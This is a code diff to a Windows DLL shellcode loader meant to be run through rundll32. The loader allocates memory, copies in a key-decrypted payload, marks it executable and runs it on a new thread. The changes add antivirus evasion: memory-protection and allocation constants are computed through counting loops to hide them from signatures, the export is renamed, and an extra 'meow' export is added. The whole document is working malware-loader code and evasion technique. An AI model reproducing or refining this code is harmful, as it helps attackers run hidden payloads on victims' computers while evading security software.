@@ -124,8 +124,19 @@ void CALLBACK run(void) {
         return;
     }
 
-    LPVOID allocMem = dynVirtualAlloc(NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    int t=1;
+    int page_readwrite = 0;
+    int page_execute_read = 0;
+    int zero = 3;
+    int mem_commit_mem_reserve = 0;
+    for (int i=0; i<4; i++) page_readwrite +=t;
+    for (int i=0; i<0x20; i++) page_execute_read+=t; 
+    for (int i=0; i<3; i++) zero -= t;
+    for (int i=0; i<0x3000; i++) mem_commit_mem_reserve+=t;
+
+    LPVOID allocMem = dynVirtualAlloc(NULL, payloadLen, mem_commit_mem_reserve, page_readwrite);
     if (!allocMem) {
+        free(key);
         return;
     }
 
@@ -133,16 +144,18 @@ void CALLBACK run(void) {
     dynMoveMemory(allocMem, payload, payloadLen);
 
     DWORD oldProtect;
-    if (!dynVirtualProtect(allocMem, payloadLen, PAGE_EXECUTE_READ, &oldProtect)) {
+    if (!dynVirtualProtect(allocMem, payloadLen, page_execute_read, &oldProtect)) {
+        free(key);
         return;
     }
 
-    HANDLE tHandle = dynCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);
+    HANDLE tHandle = dynCreateThread(zero, 0, (LPTHREAD_START_ROUTINE)allocMem, zero, zero, zero);
     if (!tHandle) {
+        free(key);
         return;
     }
     WaitForSingleObject(tHandle, INFINITE);
-    ((void(*)())allocMem)();
+    //((void(*)())allocMem)();
 }
 #else
 void CALLBACK run(char* key, DWORD keyLen) {
@@ -153,8 +166,18 @@ void CALLBACK run(char* key, DWORD keyLen) {
         free(key);
         return;
     }
+    
+    int t=1;
+    int page_readwrite = 0;
+    int page_execute_read = 0;
+    int zero = 3;
+    int mem_commit_mem_reserve = 0;
+    for (int i=0; i<4; i++) page_readwrite +=t;
+    for (int i=0; i<0x20; i++) page_execute_read+=t; 
+    for (int i=0; i<3; i++) zero -= t;
+    for (int i=0; i<0x3000; i++) mem_commit_mem_reserve+=t;
 
-    LPVOID allocMem = dynVirtualAlloc(NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID allocMem = dynVirtualAlloc(NULL, payloadLen, mem_commit_mem_reserve, page_readwrite);
     if (!allocMem) {
         free(key);
         return;
@@ -164,18 +187,18 @@ void CALLBACK run(char* key, DWORD keyLen) {
     dynMoveMemory(allocMem, payload, payloadLen);
 
     DWORD oldProtect;
-    if (!dynVirtualProtect(allocMem, payloadLen, PAGE_EXECUTE_READ, &oldProtect)) {
+    if (!dynVirtualProtect(allocMem, payloadLen, page_execute_read, &oldProtect)) {
         free(key);
         return;
     }
 
-    HANDLE tHandle = dynCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);
+    HANDLE tHandle = dynCreateThread(zero, 0, (LPTHREAD_START_ROUTINE)allocMem, zero, zero, zero);
     if (!tHandle) {
         free(key);
         return;
     }
     WaitForSingleObject(tHandle, INFINITE);
-    ((void(*)())allocMem)();
+
 
     free(key);
 }
@@ -183,7 +206,7 @@ void CALLBACK run(char* key, DWORD keyLen) {
 
 // Entry for rundll32
 extern "C" __declspec(dllexport)
-void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+void CALLBACK EPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
 #ifdef USE_HEADER_KEY
     // Mode1: standalone. KEY was coded into dll.
     run();
@@ -199,6 +222,25 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
     return 0;
 }
 #endif
+
+extern "C" __declspec(dllexport)
+void CALLBACK meow(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+#ifdef USE_HEADER_KEY
+    // Mode1: standalone. KEY was coded into dll.
+    run();
+#else
+    // Mode2: key was NOT coded into dll.
+    run(lpszCmdLine, lstrlenA(lpszCmdLine));
+#endif
+}
+
+#ifdef USE_HEADER_KEY
+DWORD WINAPI ThreadProc(LPVOID lpParam) {
+    run();
+    return 0;
+}
+#endif
+
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
